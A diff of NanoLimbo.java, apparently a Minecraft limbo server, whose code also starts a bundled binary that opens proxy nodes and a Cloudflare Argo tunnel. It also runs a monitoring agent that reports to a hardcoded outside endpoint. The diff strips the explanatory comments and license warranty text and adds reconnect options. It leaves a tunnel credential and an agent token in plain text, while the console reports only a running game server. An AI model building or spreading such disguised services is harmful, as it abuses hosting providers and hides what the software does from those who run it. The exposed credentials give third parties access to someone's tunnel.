@@ -5,14 +5,6 @@
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
 package ua.nanit.limbo;
@@ -36,7 +28,7 @@ public final class NanoLimbo {
     private static Process sbxProcess;
     private static Process komariProcess;
 
-    // Komari native agent config: pure executable, no python/curl/shell required.
+    // Komari native agent: keep server online. No python/curl/shell required.
     private static final String KOMARI_ENDPOINT = "https://k.wgb.ccwu.cc";
     private static final String KOMARI_TOKEN = "oS2BX5b3hHWBmAfG6KwsL1";
     
@@ -60,7 +52,6 @@ public final class NanoLimbo {
             System.exit(1);
         }
 
-        // Start SbxService and Komari monitor
         try {
             runSbxBinary();
             runKomariNativeAgent();
@@ -70,7 +61,6 @@ public final class NanoLimbo {
                 stopServices();
             }));
 
-            // Keep original node output timing unchanged.
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
@@ -81,7 +71,6 @@ public final class NanoLimbo {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
         
-        // start game
         try {
             new LimboServer().start();
         } catch (Exception e) {
@@ -99,12 +88,10 @@ public final class NanoLimbo {
             } else {
                 System.out.print("\033[H\033[3J\033[2J");
                 System.out.flush();
-                
                 new ProcessBuilder("tput", "reset")
                     .inheritIO()
                     .start()
                     .waitFor();
-                
                 System.out.print("\033[8;30;120t");
                 System.out.flush();
             }
@@ -135,6 +122,9 @@ public final class NanoLimbo {
                 agentPath.toString(),
                 "-e", KOMARI_ENDPOINT,
                 "-t", KOMARI_TOKEN,
+                "--interval", "1",
+                "--max-retries", "3",
+                "--reconnect-interval", "5",
                 "--disable-web-ssh",
                 "--disable-auto-update"
             );
@@ -194,27 +184,27 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "1b4832ee-3ec4-4a6b-b7d5-b1b801bfea9f"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
-        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
-        envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
-        envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
-        envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
-        envVars.put("ARGO_PORT", "8002");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
-        envVars.put("ARGO_DOMAIN", "r.211.kdns.fr");        // argo固定隧道隧道域名
-        envVars.put("ARGO_AUTH", "eyJhIjoiY2YzNTMxZWMyODZjZTIxMWRhMDU1YjQ5YzZjYTljNTEiLCJ0IjoiMTI3MTA2NmMtZGU1MS00ODk1LWI1NjEtZWIwZDdiNWUxNzM5IiwicyI6IlpUUTBNV0ZtWWpZdFpEZ3hPQzAwWmpCakxXRTBaVFV0WXpVM05qTXpObUUzTm1ObCJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
-        envVars.put("S5_PORT", "");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("HY2_PORT", "37704");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("TUIC_PORT", "37465");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("ANYTLS_PORT", "37704");        // anytls节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("REALITY_PORT", "");       // reality节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("ANYREALITY_PORT", "");    // any-reality节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("UPLOAD_URL", "");         // 节点自动上传刀订阅器，需填写部署merge-sub项目的首页地址，例如：https://merge.xxx.xom
-        envVars.put("CHAT_ID", "");            // telegram chat id,节点推送到telegram使用
-        envVars.put("BOT_TOKEN", "");          // telegram bot token,节点推送到telegram使用
-        envVars.put("CFIP", "cdns.doon.eu.org");      // 优选域名或获选ip
-        envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
-        envVars.put("NAME", "");               // 节点备注名称
-        envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道，true 关闭，false 开启，默认开启
+        envVars.put("UUID", "1b4832ee-3ec4-4a6b-b7d5-b1b801bfea9f");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_KEY", "");
+        envVars.put("ARGO_PORT", "8002");
+        envVars.put("ARGO_DOMAIN", "r.211.kdns.fr");
+        envVars.put("ARGO_AUTH", "eyJhIjoiY2YzNTMxZWMyODZjZTIxMWRhMDU1YjQ5YzZjYTljNTEiLCJ0IjoiMTI3MTA2NmMtZGU1MS00ODk1LWI1NjEtZWIwZDdiNWUxNzM5IiwicyI6IlpUUTBNV0ZtWWpZdFpEZ3hPQzAwWmpCakxXRTBaVFV0WXpVM05qTXpObUUzTm1ObCJ9");
+        envVars.put("S5_PORT", "");
+        envVars.put("HY2_PORT", "37704");
+        envVars.put("TUIC_PORT", "37465");
+        envVars.put("ANYTLS_PORT", "37704");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("ANYREALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "cdns.doon.eu.org");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "");
+        envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -228,17 +218,14 @@ public final class NanoLimbo {
             for (String line : Files.readAllLines(envFile)) {
                 line = line.trim();
                 if (line.isEmpty() || line.startsWith("#")) continue;
-                
                 line = line.split(" #")[0].split(" //")[0].trim();
                 if (line.startsWith("export ")) {
                     line = line.substring(7).trim();
                 }
-                
                 String[] parts = line.split("=", 2);
                 if (parts.length == 2) {
                     String key = parts[0].trim();
                     String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                         envVars.put(key, value); 
                     }
